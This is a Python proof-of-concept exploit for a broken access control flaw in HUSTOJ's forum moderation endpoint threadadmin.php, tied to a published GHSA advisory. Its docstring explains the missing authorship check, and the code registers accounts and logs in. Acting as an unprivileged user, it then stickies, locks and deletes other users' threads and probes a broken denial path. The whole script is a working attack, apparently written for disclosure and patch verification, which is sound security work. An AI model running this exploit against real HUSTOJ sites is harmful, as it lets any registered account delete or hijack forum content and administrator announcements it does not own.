#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HUSTOJ threadadmin.php forum moderation privilege-escalation PoC
==============================================================

Vulnerability : Missing authorship / administrator authorization check in the
                forum moderation endpoint (Broken Access Control -> Privilege
                Escalation).
Component     : zhblue/hustoj  trunk/web/threadadmin.php   (target=thread branch)
GHSA          : GHSA-2p8p-46r7-h95p
Affected      : >= 24.09.10, <= 26.08.19
Fixed in      : 26.09.12  (commits ebe4f6880 "fix errmsg" / 9644d29e "fix threadadmin")
CVSS 3.1      : AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L  = 7.1 (High)

Root cause
----------
threadadmin.php has two branches:

  * ``target=reply``  -- appends ``AND author_id=?`` so a normal user can only
    touch his own replies.  (This branch was written correctly.)

  * ``target=thread`` -- performs the UPDATE unconditionally for any ``tid``::

        UPDATE topic SET status = $stat       WHERE `tid` = '$tid';   # delete / lock
        UPDATE topic SET top_level = $toplevel WHERE `tid` = '$tid';   # sticky
        UPDATE reply  SET status = 2           WHERE topic_id = $tid;   # delete only

    The only gate is ``isset($_SESSION[$OJ_NAME.'_user_id'])`` i.e. "is logged
    in".  There is no ``topic.author_id`` comparison and no administrator
    check, so any registered account can delete / lock / sticky **any** thread,
    including administrator announcements (top_level=3).

Two adjacent defects in the same code path make the flaw worse and hide the
intended denials:

  1. ``errmsg()`` is called but never defined (the real function is
     ``err_msg()``), so every denial path raises a PHP fatal error.
  2. ``err_msg()`` itself does not ``global $OJ_TEMPLATE``, so it tries to
     ``require("template//error.php")`` -- also a fatal error.

Net effect: instead of "Permission denied." the user gets HTTP 500 whenever the
correct check *should* have fired.

Usage
-----
    # auto-register attacker + victim, then run all checks
    python3 poc.py --url http://127.0.0.1:8080/ --auto-register

    # reuse existing accounts
    python3 poc.py --url http://127.0.0.1:8080/ \
                   --attacker attacker:attacker123 \
                   --victim   victim:victim123

    # only prove "delete", against a known tid
    python3 poc.py --url http://127.0.0.1:8080/ --tid 1234 --action delete

Prerequisites on the target:  ``$OJ_BBS="discuss3"`` (discuss3 forum enabled),
``$OJ_REGISTER=true``, ``$OJ_VCODE=false`` (default), no ``$OJ_CSRF``.

Dependencies: Python 3 standard library only.
"""

import argparse
import http.cookiejar
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "Mozilla/5.0 (compatible; HUSTOJ-threadadmin-authz-poc/1.0)"

GREEN = "\033[32m"
YELLOW = "\033[33m"
RED = "\033[31m"
RESET = "\033[0m"

BODY_MARK = "hello-from-the-victim-account"
REPLY_MARK = "reply-from-the-victim-account"


# --------------------------------------------------------------------------- #
# Tiny HTTP client. Redirects are NOT followed so we can observe the 302 that
# threadadmin.php issues on success and the 500 it raises on the denial path.
# --------------------------------------------------------------------------- #
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class Client:
    def __init__(self, base):
        self.base = base if base.endswith("/") else base + "/"
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar), _NoRedirect
        )

    def _url(self, path):
        return urllib.parse.urljoin(self.base, path.lstrip("/"))

    def get(self, path):
        return self._send(self._url(path), None)

    def post(self, path, data):
        body = urllib.parse.urlencode(data).encode()
        return self._send(self._url(path), body)

    def _send(self, url, body):
        hdrs = {"User-Agent": UA, "Accept": "*/*", "Connection": "close"}
        if body is not None:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(
            url, data=body, headers=hdrs, method="POST" if body is not None else "GET"
        )
        try:
            with self.opener.open(req, timeout=25) as resp:
                return (resp.getcode(),
                        dict(resp.headers),
                        resp.read().decode("utf-8", "replace"))
        except urllib.error.HTTPError as e:
            return (e.code, dict(e.headers), e.read().decode("utf-8", "replace"))
        except urllib.error.URLError as e:
            raise SystemExit("[!] cannot reach %s: %s" % (url, e))


# --------------------------------------------------------------------------- #
# Result bookkeeping
# --------------------------------------------------------------------------- #
RESULTS = []


def note(msg):
    print("    - " + msg)


def record(name, ok, detail):
    RESULTS.append((name, ok, detail))
    mark = GREEN + "VULNERABLE" + RESET if ok else YELLOW + "  patched " + RESET
    print("  %-40s %s  %s" % (name, mark, detail))
    return ok


def banner(text):
    print("\n" + "=" * 78)
    print(text)
    print("=" * 78)


# --------------------------------------------------------------------------- #
# HUSTOJ business logic
# --------------------------------------------------------------------------- #
def register(base, user, password):
    c = Client(base)
    c.get("registerpage.php")
    c.post("register.php", {
        "user_id": user,
        "password": password,
        "rptpassword": password,
        "email": "%s@example.com" % user,
        "school": "poc",
        "nick": user,
        "vcode": "",
    })
    note("registered account %r (needs $OJ_REGISTER=true)" % user)
    return c


def login(base, user, password):
    c = Client(base)
    c.get("loginpage.php")
    _, _, body = c.post("login.php", {"user_id": user, "password": password, "vcode": ""})
    if "Wrong" in body or "wrong" in body:
        raise SystemExit("[!] login failed for %r -- check the credentials "
                         "(or $OJ_VCODE / $OJ_CSRF)" % user)
    note("logged in as %r" % user)
    return c


def list_tids(client):
    _, _, body = client.get("discuss.php")
    return [int(x) for x in re.findall(r"thread\.php\?tid=(\d+)", body)]


def new_topic(client, title):
    """Create a thread and return its tid (newest tid on the board)."""
    client.get("newpost.php")
    client.post("post.php?action=new",
                {"pid": "0", "cid": "0", "title": title, "content": BODY_MARK})
    tid = max(list_tids(client))
    client.post("post.php?action=reply",
                {"tid": str(tid), "content": REPLY_MARK})
    return tid


def thread_body(client, tid):
    _, _, body = client.get("thread.php?tid=%d" % tid)
    return body


def row_fragment(listing, tid):
    """Return the <tr> ... chunk of discuss.php that carries the thread link."""
    idx = listing.find("thread.php?tid=%d" % tid)
    if idx < 0:
        return ""
    start = listing.rfind("<tr", 0, idx)
    return listing[start:idx] if start >= 0 else listing[:idx]


def on_board(client, tid):
    _, _, listing = client.get("discuss.php")
    return ("thread.php?tid=%d" % tid) in listing


def threadadmin(client, tid, action, level=None):
    q = "target=thread&tid=%d&action=%s" % (tid, action)
    if level is not None:
        q += "&level=%d" % level
    return client.get("threadadmin.php?" + q)


# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser(
        description="HUSTOJ threadadmin.php privilege escalation PoC (GHSA-2p8p-46r7-h95p)")
    ap.add_argument("--url", default="http://127.0.0.1:8080/",
                    help="HUSTOJ site root, e.g. http://127.0.0.1:8080/")
    ap.add_argument("--attacker", default="attacker:attacker123",
                    help="unprivileged attacker account  user:password")
    ap.add_argument("--victim", default="victim:victim123",
                    help="thread owner account (or an admin)  user:password")
    ap.add_argument("--auto-register", action="store_true",
                    help="register the two accounts first")
    ap.add_argument("--tid", type=int, default=None,
                    help="target an existing tid instead of creating new threads")
    ap.add_argument("--delay", type=float, default=6.0,
                    help="seconds to wait before verifying (query cache TTL, default 6)")
    ap.add_argument("--action", default="all",
                    choices=["all", "sticky", "lock", "delete", "denial-path"],
                    help="which check(s) to run, default: all")
    args = ap.parse_args()

    au, apw = args.attacker.split(":", 1)
    vu, vpw = args.victim.split(":", 1)

    banner("HUSTOJ threadadmin.php privilege escalation   GHSA-2p8p-46r7-h95p")
    print("  target : %s" % args.url)
    print("  actor  : %s (unprivileged)" % au)
    print("  victim : %s" % vu)

    if args.auto_register:
        for u, p in ((vu, vpw), (au, apw)):
            try:
                register(args.url, u, p)
            except SystemExit:
                raise
            except Exception as exc:                        # already exists etc.
                note("register %r: %s" % (u, exc))

    # ---- Step 1: the victim publishes threads ----------------------------- #
    tids = {}
    if args.tid is not None:
        tids["delete"] = args.tid
    else:
        victim = login(args.url, vu, vpw)
        banner("Step 1  victim publishes the threads that must not be touched")
        for key, title in (("sticky", "PoC victim thread (target: sticky)"),
                           ("lock", "PoC victim thread (target: lock)"),
                           ("delete", "PoC victim thread (target: delete)")):
            if args.action not in ("all", key):
                continue
            tid = new_topic(victim, title)
            tids[key] = tid
            print("    tid=%-6d  %s" % (tid, key))

    if not tids:
        raise SystemExit("[!] nothing to test; check --action / --tid")

    # ---- Step 2: the attacker logs in and calls threadadmin.php ----------- #
    attacker = login(args.url, au, apw)
    banner("Step 2  unprivileged user calls threadadmin.php on a foreign tid")

    if args.action in ("all", "sticky") and "sticky" in tids:
        tid = tids["sticky"]
        code, hdr, _ = threadadmin(attacker, tid, "sticky", level=3)
        time.sleep(args.delay)
        _, _, listing = attacker.get("discuss.php")
        row = row_fragment(listing, tid)
        ok = code in (301, 302) and ("bg-success" in row or "bg-warning" in row)
        record("sticky  top_level=3 (turn into notice)", ok,
               "tid=%d http=%s" % (tid, code))

    if args.action in ("all", "lock") and "lock" in tids:
        tid = tids["lock"]
        code, hdr, _ = threadadmin(attacker, tid, "lock")
        time.sleep(args.delay)
        _, _, listing = attacker.get("discuss.php")
        row = row_fragment(listing, tid)
        ok = code in (301, 302) and ('class="Lock"' in row or ">Lock<" in row or u"锁定" in row)
        record("lock    status=1", ok, "tid=%d http=%s" % (tid, code))

    if args.action in ("all", "delete") and "delete" in tids:
        tid = tids["delete"]
        before_board = on_board(attacker, tid)
        before_body = BODY_MARK in thread_body(attacker, tid)
        before_reply = REPLY_MARK in thread_body(attacker, tid)
        code, hdr, _ = threadadmin(attacker, tid, "delete")
        time.sleep(args.delay)
        after_board = on_board(attacker, tid)
        after_body = BODY_MARK in thread_body(attacker, tid)
        after_reply = REPLY_MARK in thread_body(attacker, tid)
        ok = (before_board and before_body and code in (301, 302)
              and not after_board and not after_body and not after_reply)
        record("delete  status=2 (+ wipes reply table)", ok,
               "tid=%d http=%s board:%s->%s topic:%s->%s reply:%s->%s"
               % (tid, code, before_board, after_board,
                  before_body, after_body, before_reply, after_reply))

    if args.action in ("all", "denial-path"):
        tid = list(tids.values())[-1]
        code, hdr, body = threadadmin(attacker, tid, "not-a-real-action")
        broken = (code == 500) or ("undefined function errmsg" in body) \
            or ("Permission denied" in body)
        record("secondary  errmsg() undefined -> HTTP 500", broken,
               "http=%s" % code)

    # ---- Summary ---------------------------------------------------------- #
    banner("Result")
    vuln = 0
    for name, ok, _ in RESULTS:
        print("  %-40s %s" % (name, GREEN + "VULNERABLE" + RESET if ok
                              else YELLOW + "patched" + RESET))
        vuln += 1 if ok else 0
    print("")
    if vuln:
        print("  " + RED + ">>> VULNERABLE" + RESET +
              ": a registered user can delete / lock / sticky any forum thread.")
        return 0
    print("  >>> not reproduced (a patched build answers 'Permission denied.').")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)